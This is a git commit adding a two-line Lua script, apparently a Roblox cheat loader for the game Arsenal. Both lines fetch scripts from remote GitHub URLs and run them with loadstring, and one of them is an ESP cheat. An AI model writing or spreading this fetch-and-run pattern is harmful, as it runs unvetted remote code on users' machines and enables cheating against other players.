a0aa0232acfa9ec44e329246a5c5b6149b437f6a
thanbhui64 <duchieub690@gmail.com>
2024-10-19 08:44:19 +0700

    Arsenal.lua

---
+++ Arsenal.lua
@@ -0,0 +1,2 @@
+pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))() end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Malrand/Malrand/main/Arsenal"))()
